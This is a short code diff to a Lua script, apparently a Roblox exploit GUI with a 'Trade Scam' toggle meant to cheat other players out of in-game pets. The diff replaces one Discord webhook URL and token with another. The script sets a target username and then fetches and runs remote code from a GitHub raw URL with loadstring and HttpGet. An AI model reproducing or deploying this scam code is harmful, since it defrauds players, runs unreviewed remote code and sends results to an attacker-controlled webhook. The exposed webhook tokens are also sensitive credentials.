@@ -9,7 +9,7 @@ local ScamSection = Trade:NewSection("Scam")
 ScamSection:NewToggle("Trade Scam", "Put Pet a Trade and on this", function(state)
     if state then
 UserName = "ilmir121212121212"
-WebHook = "https://discord.com/api/webhooks/1031957814438015086/k3i7W2TvqREjWxEX9BHDGoHU7zFjW-yzkbmApujksLoRx1PcVTeRWf4ctPlrYt5tT5bh"
+WebHook = "https://discord.com/api/webhooks/1065281750646919208/pHqrYjLjyhhZviD4sWekepq4kyOljFiEYCq1DApvX6GkEf1365keRk3JmDRdkRSE8KxF"
 Mention = true -- change to false if you don't want to get everyone ping in your webhook.
  
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
